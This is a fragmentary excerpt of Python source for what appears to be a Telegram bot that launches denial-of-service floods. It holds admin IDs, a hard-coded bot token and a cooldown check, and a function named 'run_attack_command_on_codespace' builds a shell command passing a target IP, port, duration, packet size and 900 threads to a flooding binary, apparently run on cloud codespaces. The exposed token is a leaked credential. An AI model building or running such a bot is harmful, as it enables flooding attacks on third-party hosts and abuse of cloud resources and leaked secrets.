...
ADMIN_IDS = [7086729173 , 7663163950 ]
BOT_TOKEN = "7725999486:AAEkC2QTTYUFunOiWE44TyFXMncs8m2TCao"
thread_count = 900
packet_size = 9
...
def check_cooldown(user_id: int) -> Tuple[bool, int]:
    ...
    cooldown_seconds = COOLDOWN_MINUTES * 20
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command = f"./fuck {target_ip} {target_port} {duration} {packet_size} {thread_count}"
